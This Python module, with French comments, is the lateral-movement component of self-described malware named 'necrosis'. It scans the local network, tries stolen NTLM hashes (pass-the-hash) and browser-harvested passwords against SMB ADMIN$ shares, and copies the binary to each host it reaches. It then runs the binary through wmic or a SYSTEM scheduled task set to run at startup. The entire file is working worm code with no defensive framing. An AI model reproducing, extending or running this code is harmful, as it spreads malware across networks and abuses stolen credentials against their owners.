# services/pivoting.py - RÉEL sans simulations inutiles
import os
import sys
import socket
import subprocess
import platform
import re
import tempfile
import shutil
import json
from pathlib import Path
from typing import List, Optional, Tuple
from dataclasses import dataclass, field

# Tentative d'import d'impacket (optionnel mais recommandé)
try:
    from impacket.smbconnection import SMBConnection
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

@dataclass
class TargetMachine:
    ip: str
    hostname: str
    os: str = "Unknown"
    services: List[str] = field(default_factory=list)
    credentials_used: List[str] = field(default_factory=list)
    admin_share_accessible: bool = False

class PivotingEngine:
    def __init__(self):
        self.system = platform.system()
        self.local_ip = self._get_local_ip()
        self.targets = []

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def discover_network(self) -> List[TargetMachine]:
        print("🌐 Découverte réseau...")
        targets = []
        seen = set()

        # net view
        if self.system == "Windows":
            try:
                result = subprocess.run(["net", "view"], capture_output=True, text=True, timeout=30, encoding='cp437')
                for line in result.stdout.split('\n'):
                    if "\\\\" in line:
                        match = re.search(r'\\\\([A-Za-z0-9-]+)', line)
                        if match:
                            hostname = match.group(1)
                            try:
                                ip = socket.gethostbyname(hostname)
                                if ip not in seen:
                                    seen.add(ip)
                                    targets.append(TargetMachine(ip=ip, hostname=hostname, os="Windows"))
                            except:
                                pass
            except:
                pass

        # Ping sweep (avec timeout plus court pour éviter les lenteurs)
        subnet = '.'.join(self.local_ip.split('.')[:3])
        for i in range(1, 25):
            ip = f"{subnet}.{i}"
            if ip == self.local_ip or ip in seen:
                continue
            try:
                if self.system == "Windows":
                    result = subprocess.run(["ping", "-n", "1", "-w", "500", ip], capture_output=True, timeout=1)
                else:
                    result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, timeout=1)
                if result.returncode == 0:
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        hostname = ip
                    targets.append(TargetMachine(ip=ip, hostname=hostname, os="Unknown"))
                    seen.add(ip)
            except:
                continue

        # ARP cache
        try:
            if self.system == "Windows":
                result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=5)
            else:
                result = subprocess.run(["ip", "neigh"], capture_output=True, text=True, timeout=5)
            for ip in re.findall(r'(\d+\.\d+\.\d+\.\d+)', result.stdout):
                if ip not in seen and ip != self.local_ip:
                    targets.append(TargetMachine(ip=ip, hostname=ip, os="Unknown"))
                    seen.add(ip)
        except:
            pass

        self.targets = targets
        return targets

    def try_credentials(self, credential, targets: List[TargetMachine]) -> bool:
        """
        Tente de s'authentifier sur les cibles en utilisant les identifiants extraits.
        Ne tente des combinaisons par défaut que si des identifiants sont disponibles.
        """
        if not targets:
            return False

        # Extraire les infos du credential
        if hasattr(credential, 'source'):
            source = credential.source
            cred_type = credential.type
            secret = credential.secret
        else:
            source = credential.get('source', 'unknown')
            cred_type = credential.get('type', 'unknown')
            secret = credential.get('secret', '')

        print(f"  🔑 Tentative avec {source} ({cred_type})...")

        # Liste des (username, password) à tester
        credentials_to_try = []

        # 1. Si c'est un hash NTLM (LSASS ou SAM) et impacket est disponible
        if cred_type in ["memory_dump", "hash"] and IMPACKET_AVAILABLE:
            import base64
            try:
                ntlm_hash = base64.b64decode(secret).hex()
                # On va tenter avec le hash directement pour chaque cible
                for target in targets:
                    if target.admin_share_accessible:
                        continue
                    try:
                        smb = SMBConnection(target.ip, target.ip)
                        smb.login("administrator", "", "", ntlm_hash)
                        print(f"      ✅ Pass-the-Hash réussi sur {target.ip}")
                        target.admin_share_accessible = True
                        target.credentials_used.append("NTLM")
                        return True
                    except Exception as e:
                        print(f"      ❌ PTH échoué sur {target.ip}: {e}")
            except Exception as e:
                print(f"      ❌ Erreur avec le hash: {e}")

        # 2. Si c'est un fichier de credentials (Firefox, Chrome) ou des cookies
        elif "firefox" in source.lower() or "chrome" in source.lower() or "credentials" in source.lower():
            # Essayer d'extraire des paires username/password du secret
            try:
                data = json.loads(secret)
                if isinstance(data, list):
                    for entry in data:
                        if entry.get('username') and entry.get('password'):
                            credentials_to_try.append((entry['username'], entry['password']))
                elif isinstance(data, dict):
                    # Parcourir les valeurs pour trouver des creds
                    for key, value in data.items():
                        if isinstance(value, dict) and 'username' in value and 'password' in value:
                            credentials_to_try.append((value['username'], value['password']))
                        elif isinstance(value, list):
                            for item in value:
                                if isinstance(item, dict) and 'username' in item and 'password' in item:
                                    credentials_to_try.append((item['username'], item['password']))
            except:
                pass

        # 3. Si on n'a rien trouvé, mais que le secret pourrait être un mot de passe (ex: arp table n'est pas utilisable)
        #    On ne fait rien, on ne tente pas de combinaisons par défaut.

        # 4. Si on a des identifiants à tester, on les essaie sur chaque cible
        if credentials_to_try:
            for username, password in credentials_to_try:
                for target in targets:
                    if target.admin_share_accessible:
                        continue
                    if self._try_smb_with_password(target, username, password):
                        return True
        else:
            print("      ⚠️ Aucun identifiant utilisable extrait, impossible de pivoter.")

        return False

    def _try_smb_with_password(self, target: TargetMachine, username: str, password: str) -> bool:
        """Tente une connexion SMB avec mot de passe en clair."""
        try:
            # On réduit le timeout à 5 secondes pour éviter les lenteurs
            cmd = f'net use \\\\{target.ip}\\ADMIN$ /user:{username} {password}'
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            if result.returncode == 0:
                print(f"      ✅ SMB réussi sur {target.ip} avec {username}")
                target.admin_share_accessible = True
                target.credentials_used.append(f"SMB_{username}")
                return True
            else:
                # Si le timeout dépasse, on considère que ça ne marche pas
                print(f"      ❌ SMB échoué sur {target.ip} avec {username}")
                return False
        except subprocess.TimeoutExpired:
            print(f"      ❌ Timeout sur {target.ip} avec {username}")
            return False
        except Exception as e:
            print(f"      ❌ Erreur SMB: {e}")
            return False

    def propagate(self, source_binary: Path):
        """Copie et exécute le binaire sur les cibles ayant ADMIN$ accessible."""
        print("🔄 Propagation du malware...")
        if not self.targets:
            print("   Aucune cible.")
            return

        for target in self.targets:
            if not target.admin_share_accessible:
                print(f"   ⏭️ Pas d'accès admin sur {target.ip}")
                continue

            try:
                # Copie
                dest_path = f"\\\\{target.ip}\\ADMIN$\\necrosis.exe"
                if not self._copy_file(target.ip, source_binary, dest_path):
                    dest_path = f"\\\\{target.ip}\\C$\\Windows\\Temp\\necrosis.exe"
                    if not self._copy_file(target.ip, source_binary, dest_path):
                        print(f"   ❌ Échec copie sur {target.ip}")
                        continue
                print(f"   ✅ Copie réussie sur {target.ip}")

                # Exécution via wmic
                cmd = f'wmic /node:"{target.ip}" process call create "{dest_path}"'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                if result.returncode == 0:
                    print(f"   ✅ Exécution déclenchée sur {target.ip}")
                else:
                    # Fallback : schtasks
                    subprocess.run(f'schtasks /create /s {target.ip} /tn "NecrosisUpdate" /tr "{dest_path}" /sc onstart /ru SYSTEM /f', shell=True, timeout=30)
                    subprocess.run(f'schtasks /run /s {target.ip} /tn "NecrosisUpdate"', shell=True, timeout=30)
                    print(f"   ✅ Tâche planifiée exécutée sur {target.ip}")
            except Exception as e:
                print(f"   ❌ Erreur propagation sur {target.ip}: {e}")

    def _copy_file(self, target_ip: str, source_path: Path, dest_path: str) -> bool:
        try:
            cmd = f'copy "{source_path}" "{dest_path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            return result.returncode == 0
        except:
            return False